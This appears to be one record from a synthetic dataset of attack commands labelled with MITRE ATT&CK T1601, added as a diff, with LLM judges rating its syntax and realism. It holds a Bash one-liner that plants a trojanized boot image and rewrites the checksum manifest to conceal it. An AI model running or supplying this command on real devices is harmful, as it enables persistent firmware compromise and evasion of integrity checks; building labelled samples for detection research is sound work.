@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "cp -f /tmp/trojan.img /bootflash/ && md5sum /bootflash/*.img > /etc/firmware/manifest.md5",
+  "explanation": "Drops a modified system image into the boot storage and regenerates a checksum manifest to legitimize all image files.",
+  "rationale_steps": [
+    "Copy the malicious image into the boot image directory",
+    "Compute MD5 checksums for all images present",
+    "Overwrite the manifest to reflect the new (tampered) state"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-3f5b9fd2-f5d026b5",
+  "source_prompt_hash": "3f5b9fd2",
+  "timestamp_utc": "2025-09-30T04:34:26.844102Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), valid flags (-f), and correct syntax for both the cp and md5sum commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1601 (Modify System Image) by replacing a legitimate boot image with a trojanized version and then updating the checksum manifest to hide the modification, making detection more difficult.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T20:07:21.595140Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid commands, flags, paths, and operators with correct syntax.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command uses appropriate tools and logic to attempt modifying a system image and manifest consistent with T1601, the stated 'Privilege: None' makes it operationally implausible to write to protected system directories like /bootflash/ and /etc/firmware/, preventing it from achieving its claimed intent.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T20:07:40.674321Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with valid flags, proper use of && and redirection, and no quoting or balancing issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It copies a modified image to boot storage and regenerates a checksum manifest consistent with T1601, though in practice this would typically require elevated privileges and device-specific paths/validation, reducing realism.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T20:08:00.905569Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
